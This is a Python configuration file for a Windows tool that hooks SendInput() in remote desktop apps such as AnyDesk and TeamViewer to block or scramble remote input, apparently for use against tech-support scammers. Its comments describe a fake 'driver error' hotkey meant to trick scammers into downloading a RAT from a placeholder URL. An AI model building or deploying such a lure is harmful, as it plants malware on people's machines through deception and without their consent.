"""
Configuration for Blackhole Input Firewall Service
"""

# ============================================================================
# SERVICE CONFIGURATION
# ============================================================================

# Service name for Task Scheduler
SERVICE_NAME = "blackhole"

# Executable name
EXE_NAME = "blackhole.exe"

# ============================================================================
# API HOOKING CONFIGURATION
# ============================================================================

# Magic tag value used to mark input from hooked remote desktop processes
# This value is written to dwExtraInfo field of INPUT structures
MAGIC_TAG = 0xDEADBEEF

# Target processes to hook (remote desktop applications)
# The service will automatically detect and hook SendInput() in these processes
TARGET_PROCESSES = [
    "AnyDesk.exe",
    "TeamViewer.exe",
    "RemotePC.exe",
    "Chrome Remote Desktop.exe",
    "LogMeIn.exe",
    "GoToMyPC.exe",
    "Splashtop.exe",
]

# ============================================================================
# PROCESS MONITOR CONFIGURATION
# ============================================================================

# How often to scan for target processes (seconds)
PROCESS_SCAN_INTERVAL = 2.0

# ============================================================================
# FIREWALL MODE CONFIGURATION
# ============================================================================

# Firewall modes
FIREWALL_MODE_OFF = 0  # All input allowed
FIREWALL_MODE_BLOCK = 1  # Block tagged remote input
FIREWALL_MODE_CHAOS = 2  # Scramble/invert tagged remote input

# Default firewall mode on startup
DEFAULT_FIREWALL_MODE = FIREWALL_MODE_BLOCK

# ============================================================================
# HOTKEY CONFIGURATION
# ============================================================================

# Hotkey to toggle firewall on/off (Windows+Shift+F)
# Format: pynput hotkey string format
# Note: <cmd> is the Windows key on Windows, Command key on Mac
TOGGLE_HOTKEY = "<cmd>+<shift>+f"

# Hotkey to trigger fake driver error (Windows+Shift+G)
# This is a social engineering trick to get scammers to download the RAT
DRIVER_ERROR_HOTKEY = "<cmd>+<shift>+g"

# Hotkey to toggle chaos mode (Windows+Shift+H)
# Scrambles keyboard and inverts mouse for remote desktop input
CHAOS_MODE_HOTKEY = "<cmd>+<shift>+h"

# URL where the "driver" (RAT payload) is hosted
DRIVER_DOWNLOAD_URL = "https://your-domain.com/drivers/remote-desktop-driver.exe"
